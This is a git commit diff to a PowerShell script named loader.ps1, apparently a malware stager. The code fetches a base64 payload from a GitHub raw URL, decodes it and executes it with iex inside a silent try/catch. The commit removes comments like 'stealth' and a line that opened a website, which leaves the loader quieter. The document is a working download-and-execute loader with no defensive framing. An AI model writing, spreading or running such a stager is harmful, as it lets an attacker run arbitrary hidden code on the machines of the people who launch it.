4a71096605b6b7c0348604f0e264c8e208440f16
Extremelyz <103514429+Extremelyz@users.noreply.github.com>
2026-04-03 17:36:30 +0700

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,18 +1,12 @@
-﻿# stealth + tls
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+﻿[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
     $u = "https://raw.githubusercontent.com/Extremelyz/shhhhh/refs/heads/main/payload.b64"
 
     $b = (New-Object Net.WebClient).DownloadString($u)
 
-    # decode
     $d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b))
 
-    # run
     iex $d
-
-    # optional: เปิดเว็บ
-    Start-Process "https://www.fbi.gov/"
 
 } catch {}
